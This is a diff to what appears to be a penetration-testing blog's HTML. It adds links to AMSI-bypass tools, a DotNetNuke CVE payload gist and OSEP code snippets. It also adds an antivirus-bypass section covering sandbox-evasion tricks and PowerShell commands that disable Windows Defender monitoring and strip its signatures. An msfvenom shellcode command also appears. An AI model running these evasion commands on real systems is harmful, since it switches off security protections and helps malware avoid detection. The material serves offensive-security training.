@@ -211,6 +211,7 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <li><a href="https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/">https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/</a></li>
 <li><a href="https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html">https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html</a></li>
 <li><a href="https://malicious.link/post/2016/kerberoast-pt1/">https://malicious.link/post/2016/kerberoast-pt1/</a></li>
+<li><a href="https://gist.github.com/pwntester/72f76441901c91b25ee7922df5a8a9e4">https://gist.github.com/pwntester/72f76441901c91b25ee7922df5a8a9e4</a> <strong>&lt;&mdash; DotNetNuke (CVE-2017-9822) Payloads</strong></li>
 </ul>
 <h4 id="powershell">Powershell</h4>
 <ul>
@@ -248,8 +249,10 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <li><a href="https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/">https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/</a> <strong>&lt;&ndash; Abuse Constrained Delegation</strong></li>
 <li><a href="https://twitter.com/cube0x0/status/1468860246307258370?s=21">https://twitter.com/cube0x0/status/1468860246307258370?s=21</a></li>
 </ul>
-<h4 id="exploit-developmentreversing">Exploit Development/Reversing</h4>
+<h4 id="exploit-developmentreversingavedr-bypass">Exploit Development/Reversing/AV|EDR Bypass</h4>
 <ul>
+<li><a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a></li>
+<li><a href="https://amsi.fail/">https://amsi.fail/</a> <strong>&lt;&mdash;- Automatic generation of some AMSI Bypass</strong></li>
 <li><a href="https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf">https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf</a></li>
 <li><a href="https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/">https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/</a></li>
 <li><a href="https://github.com/m0n0ph1/Process-Hollowing">https://github.com/m0n0ph1/Process-Hollowing</a></li>
@@ -301,6 +304,7 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 </ul>
 <h4 id="general-hacking-cheatsheetscool-articlespodcasts">General Hacking Cheatsheets/Cool Articles/Podcasts</h4>
 <ul>
+<li><a href="https://github.com/chvancooten/OSEP-Code-Snippets">https://github.com/chvancooten/OSEP-Code-Snippets</a> <strong>&lt;&mdash;- OSEP Code Snippets!</strong></li>
 <li><a href="https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md">https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md</a></li>
 <li><a href="https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads">https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads</a></li>
 <li><a href="https://redtm.com/docs/web-pentest/2021-01-12-web-penetration-testing-task-check-list/">https://redtm.com/docs/web-pentest/2021-01-12-web-penetration-testing-task-check-list/</a></li>
@@ -1679,7 +1683,39 @@ EOF
 /usr/bin/msfvenom
 </code></pre></div><h3 id="shellcode-poc-calcexe">Shellcode POC: calc.exe</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">msfvenom -p windows/exec -b &#39;\x00\x0A&#39; -f python --var-name buffer CMD=calc.exe EXITFUNC=thread
-</code></pre></div><h2 id="active-directory">Active Directory</h2>
+</code></pre></div><h2 id="antivirus-bypass">Antivirus Bypass</h2>
+<p>Antivirus tend to flag malware by Signature/Heuristics detection, we could bypass these throughout certain techniques
+For more details, look up into the [Exploit Development/Reversing/AV|EDR Bypass](<a href="https://ceso.github.io/2020/12/hacking-resources/#exploit-developmentreversingAV">https://ceso.github.io/2020/12/hacking-resources/#exploit-developmentreversingAV</a>|EDR Bypass) Section on the resources part of my blog.</p>
+<h3 id="signature-bypass">Signature Bypass</h3>
+<p>For example, we can obfuscate the code ciphering and/or encoding (having a decipher/decoding routine in the code), as also leverage tools dedicated for this purpose.
+Another thing is to use NOT common name for functions, variable names, etc; lunfardos, slang, idioisms, weird words from the dictionary, etc.</p>
+<h3 id="heuristics-bypass">Heuristics Bypass</h3>
+<p>As for the heuristics for example AV&rsquo;s tend to execute the malware inside a sandbox, we could have code for detecting if running inside a sandbox and exit if this is true.
+I could use the following techniques:</p>
+<ul>
+<li>Sleep command and comparision of how real time has passed (AV&rsquo;s could NOT wait until the sleep and just fast-forward the time)</li>
+<li>A counter up to 1 billon (Same story than Sleep, could not wait until it finishes and just exits)</li>
+<li>Call Windows API&rsquo;s poor or not even documented (as AV&rsquo;s tend to emulate API&rsquo;s inside the sandboxes, but some of them will not, then at the malware trying to call it and not existing, it will be detected is running inside a Sandbox)</li>
+<li>Verifying the name of the malware (AV&rsquo;s could rename the file, if it has changed it might be running inside a sandbox)</li>
+<li>Veifying if I can allocate TOO MUCH memory</li>
+<li>Checking if a known user in the system exists, if it doesn&rsquo;t exit</li>
+</ul>
+<h3 id="if-not-av-bypass-and-admin-disable-defender">If NOT AV Bypass and Admin, DISABLE Defender</h3>
+<p>If we have admin creds, we could disable Win Defender, please note THIS IS NEVER a good idea in production environments as this can be monitored!!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"># Query <span style="color:#66d9ef">if</span> there is already an excluded path
+  Get-MpPreference | select-object -ExpandProperty ExclusionPath
+# Disable real time monitoring
+  Set-MpPreference -DisableRealtimeMonitoring $true
+# Exclude temp dir from monitoring by defender
+  Add-MpPreference -ExclusionPath &#34;C:\windows\temp&#34;
+# Disable Defender ONLY <span style="color:#66d9ef">for</span> downloaded files
+  Set-MpPreference -DisableIOAVProtection $true
+# Or REMOVE ALL Signature<span style="color:#960050;background-color:#1e0010">&#39;</span>s but leave it enabled
+  &#34;C:\Program Files\Windows Defender\MpCmdRun.exe&#34; -RemoveDefinitions -All
+</code></pre></div><h3 id="amsi-bypass">AMSI Bypass</h3>
+<p>AMSI (Anti-Malware Scan Interface), in short sit&rsquo;s between Powershell and Defender, so even if our crafted malware/tools have an AV Bypass, it still can be flagged by AMSI (annoying!), AMSI can also be leveraged for example for EDR&rsquo;s. There are certain ways to bypass AMSI, for example forcing it to fail.</p>
+<p>IT&rsquo;S RECOMMENDED TO ALWAYS HAVE AN AMSI BYPASS BEFORE EXECUTING POWERSHELL PAYLOAD!</p>
+<h2 id="active-directory">Active Directory</h2>
 <h3 id="permissions-ace-access-control-enties-sddl-security-descriptor-definition-language---format">Permissions: ACE (Access Control Enties) SDDL (Security Descriptor Definition Language) - Format</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
 <span style="color:#960050;background-color:#1e0010">
